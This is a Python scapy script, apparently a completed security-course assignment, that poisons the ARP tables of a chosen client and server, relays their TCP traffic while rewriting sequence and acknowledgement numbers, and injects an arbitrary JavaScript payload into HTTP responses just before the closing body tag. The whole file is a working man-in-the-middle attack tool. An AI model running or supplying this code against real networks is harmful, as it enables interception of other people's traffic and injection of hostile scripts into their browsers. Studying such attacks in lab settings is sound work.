# largely copied from https://0x00sec.org/t/quick-n-dirty-arp-spoofing-in-python/487
from scapy.all import *
from scapy.layers import http

import traceback

import argparse
import os
import re
import sys
import threading
import time

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
    parser.add_argument("-ip2", "--serverIP", help="IP of the server", required=True)
    parser.add_argument("-s", "--script", help="script to inject", required=True)
    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=0, type=int)
    return parser.parse_args()


def debug(s):
    global verbosity
    if verbosity >= 1:
        print('#{0}'.format(s))
        sys.stdout.flush()


# TODO: returns the mac address for an IP
def mac(IP):
    return getmacbyip(IP)

def spoof_thread(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC, interval = 3):
    while True:
        spoof(serverIP, attackerMAC, clientIP, clientMAC) # TODO: Spoof client ARP table
        spoof(clientIP, attackerMAC, serverIP, serverMAC) # TODO: Spoof server ARP table
        time.sleep(interval)


# TODO: spoof ARP so that dst changes its ARP table entry for src 
def spoof(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"spoofing {dstIP}'s ARP table: setting {srcIP} to {srcMAC}")
    packet = Ether(src=srcMAC, dst=dstMAC, type=0x806)/ARP(op="is-at", psrc=srcIP, pdst=dstIP, hwsrc=srcMAC, hwdst=dstMAC)
    sendp(packet)

# TODO: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"restoring ARP table for {dstIP}")
    packet = ARP(op="is-at", pdst=dstIP, hwdst=dstMAC, psrc=srcIP, hwsrc=srcMAC)
    send(packet)


# TODO: handle intercepted packets
# NOTE: this intercepts all packets that are sent AND received by the attacker, so 
# you will want to filter out packets that you do not intend to intercept and forward
clientSeq = 0
clientAck = 0
clientLastLen = 0
serverSeq = 0
serverAck = 0
serverLastLen = 0
injectedLen = 0
handshakes = 0
waiting = False
def interceptor(packet):
    global clientMAC, clientIP, serverMAC, serverIP, attackerMAC
    global clientSeq, clientAck, clientLastLen, serverSeq, serverAck, serverLastLen, injectedLen, handshakes
    global waiting

    injection = "<script>" + args.script + "</script>"

    try:
        # Check if we want to intercept
        if(packet.haslayer(Ether) and packet[Ether].src == attackerMAC):
            # We sent this packet, ignore
            return

        if(not packet.haslayer(IP) or not packet.haslayer(Ether)):
            return


        # Intercept client packets
        if(packet[IP].src == clientIP and packet[IP].dst == serverIP):
            if(packet.haslayer(TCP)):                
                # Update our sequence numbers
                clientSeq = packet[TCP].seq
                clientAck = packet[TCP].ack
                clientLastLen = packet[IP].len - 59 # Header sizes
                        
                packet[Ether].src = attackerMAC
                packet[Ether].dst = serverMAC

                if packet[TCP].flags == "S":
                    print("# Got new connection, resetting handshakes")
                    handshakes = 0 # Reset counter for new connection
                    injectedLen = 0
                    waiting = False

                # Match up ACK number to server expected value
                if handshakes < 3:
                    handshakes += 1
                else:
                    packet[TCP].seq = serverAck
                    packet[TCP].ack = serverSeq + serverLastLen + injectedLen
                    
                del packet[TCP].chksum
                del packet[IP].chksum
                del packet[Ether].chksum
                packet.show2(dump=True)

                print("# Got TCP from client")
                return sendp(packet)
        
        # Intercept server packets
        if(packet[IP].src == serverIP and packet[IP].dst == clientIP):
            if(packet.haslayer(TCP)):
                serverLastLen = packet[IP].len - 59 # Header sizes
                serverSeq = packet[TCP].seq
                serverAck = packet[TCP].ack
                            
                if(packet.haslayer(http.HTTPResponse) and not waiting):
                    # Modify HTTP responses
                    content = packet[http.HTTPResponse].payload
                    content = bytes(content).decode()

                    pattern = re.compile(r"</body>")
                    m = pattern.search(content)
                    
                    if not m:
                        waiting = True
                        print("# Body tag not found!")
                        # print("# Payload:", content)
                    else:
                        new_content = content[:m.start()] + injection + content[m.start():]
                        
                        # print("# New payload:", new_content)
                       
                        packet[http.HTTPResponse].payload = Raw(load=new_content.encode())
                        injectedLen += len(injection)
                    # Even if we didn't modify content we will later so we need to change the Content_Length
                    clen = int(packet[http.HTTPResponse].Content_Length.decode())
                    clen += len(injection)
                    packet[http.HTTPResponse].Content_Length = str(clen)
                elif (packet.haslayer(http.HTTP)):
                    content = packet[http.HTTP].payload
                    content = bytes(content).decode()

                    pattern = re.compile(r"</body>")
                    m = pattern.search(content)
                    if not m:
                        print("# Body tag not found!")
                    else:
                        waiting = False
                        new_content = content[:m.start()] + injection + content[m.start():]

                        # print("# New payload:", new_content)

                        packet[TCP].payload = Raw(load=new_content)
                        injectedLen += len(injection)
                else:
                    print("# Got TCP from server")

                if packet.haslayer(http.HTTP):
                    print("# Sending back HTTP packet to client")
                
                packet[Ether].src = attackerMAC
                packet[Ether].dst = clientMAC

                if handshakes < 3:
                    handshakes += 1
                else:
                    packet[TCP].seq = clientAck
                    packet[TCP].ack = clientSeq + clientLastLen

                del packet[TCP].chksum
                del packet[IP].chksum
                del packet[IP].len
                del packet[Ether].chksum
                packet.show2(dump=True)

                return sendp(packet)
                
    except Exception as e:
        print("# Error:", traceback.format_exc())
        

if __name__ == "__main__":
    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0 # minimize scapy verbosity
    conf.iface = args.interface # set default interface

    clientIP = args.clientIP
    serverIP = args.serverIP
    attackerIP = get_if_addr(args.interface)

    clientMAC = mac(clientIP)
    serverMAC = mac(serverIP)
    attackerMAC = get_if_hwaddr(args.interface)

    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
    sniff_th.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, serverIP, serverMAC)
        restore(serverIP, serverMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, serverIP, serverMAC)
    restore(serverIP, serverMAC, clientIP, clientMAC)
